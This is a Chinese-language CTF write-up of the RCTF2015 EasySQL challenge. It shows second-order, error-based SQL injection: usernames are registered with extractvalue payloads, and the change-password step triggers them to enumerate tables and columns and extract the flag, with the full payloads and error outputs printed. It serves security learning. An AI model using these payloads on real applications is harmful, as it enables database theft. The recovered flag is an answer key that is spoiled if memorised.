---
title: '[RCTF2015]EasySQL 1'
categories:
  - 
tags: []
abbrlink: 5a51d74f
date: 2026-03-01 13:30:08
---
# [RCTF2015]EasySQL

# 1



寻找注入点，这里利用的是二次注入，

我的理解是先埋雷，然后打开雷得到想要的内容

---

我们可以猜测更改密码的后端代码

update 新密码 where username="用户名"

```sql
update password='xxxx' where username="xxxx"
```

那这里我们利用报错注入，修改用户名为我们的注入内容即可

```
update password='xxxx' where username="admin"||extractvalue(1,...,0x7e))#
```

为什么是admin？前面注册的时候发现这个admin用户名已经被注册过了

重新注册，用户名为以下内容：

```
admin"||extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database()),0x7e))#


```





1.注册（埋雷）

![image-20260225131614107](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260225131614107.png)

2.登录

![image-20260225131604192](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260225131604192.png)

3.修改密码

![image-20260225131546330](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260225131546330.png)



4.更新密码，得到回显

![image-20260225131525496](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260225131525496.png)





同理，接下来查找列名

```
admin"||extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)='flag'),0x7e))#
```



![image-20260225131905600](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260225131905600.png)



5.查找内容

```
admin"||extractvalue(1,concat(0x7e,(select(flag)from(flag)),0x7e))#
```





发现flag再其他地方，试试users库

![image-20260225132239742](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260225132239742.png)







```
admin"||extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)='users'),0x7e))#
```



![image-20260225132437822](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260225132437822.png)



```
admin"||extractvalue(1,concat(0x7e,(select(real_flag_1s_her)from(users)),0x7e))#
```

Unknown column 'real_flag_1s_her' in 'field list'

因为字数限制，here变成和her，当然会给报错



修改为here

```
admin"||extractvalue(1,concat(0x7e,(select(real_flag_1s_here)from(users)),0x7e))#
```



Subquery returns more than 1 row

->说明flag不在开头的明显位置，具体的位置我们要去继续查询

使用regexp('^f')
REGEXP 是 Regular Expression 的缩写。

`'^f'`指f字母开头的



```
admin"||extractvalue(1,concat(0x7e，(select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp('^f'))))#
```

XPATH syntax error: '~flag{3745f888-e900-4050-b421-d2'

flag还没结束，后面看不到到了，用reverse倒置从后往前读





```
admin"||extractvalue(1,concat(0x7e,reverse((select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp('^f')))))#

```

XPATH syntax error: '~}699a28101d2d-124b-0504-009e-88'

别忘记再reverse一次才是我们要的内容

![image-20260225135232241](https://cdn.jsdelivr.net/gh/2829750658t-svg/Blog-images@main/image-20260225135232241.png)

得到

88-e900-4050-b421-d2d10182a996}~



拼接得到

flag{3745f888-e900-4050-b421-d2d10182a996}



